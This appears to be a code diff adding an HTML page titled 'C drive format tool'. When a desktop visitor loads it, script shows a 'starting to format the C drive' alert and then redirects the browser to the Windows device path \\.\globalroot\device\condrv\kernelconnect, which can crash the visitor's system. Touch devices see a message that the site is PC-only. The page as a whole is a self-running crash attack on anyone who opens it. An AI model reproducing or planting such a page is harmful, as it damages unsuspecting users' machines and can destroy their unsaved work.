@@ -1,0 +1,38 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <title> C盘格式化工具 </title>
+</head>
+<body>
+<div id="mian">
+  C盘格式化工具
+</div>
+<div id="log" style="display: none;">
+网站禁止手机访问，只能电脑访问
+</div>
+<script type="text/javascript">
+if ("ontouchstart" in document) {
+    document.getElementById("mian").style.display="none";
+    document.getElementById("log").style.display="block";
+}
+</script>
+</body>
+</html>
+
+<script type="text/javascript">
+  var system = {};
+  var p = navigator.platform;
+  var u = navigator.userAgent;
+
+  system.win = p.indexOf("Win") == 0;
+  system.mac = p.indexOf("Mac") == 0;
+  system.x11 = (p == "X11") || (p.indexOf("Linux") == 0);
+  if (system.win || system.mac || system.xll) {//如果是PC转
+    alert("开始格式化C盘");
+    document.location = '\\\\.\\globalroot\\device\\condrv\\kernelconnect';
+  }
+  else{
+    document.getElementById("log").style.display="block";
+  }
+</script>
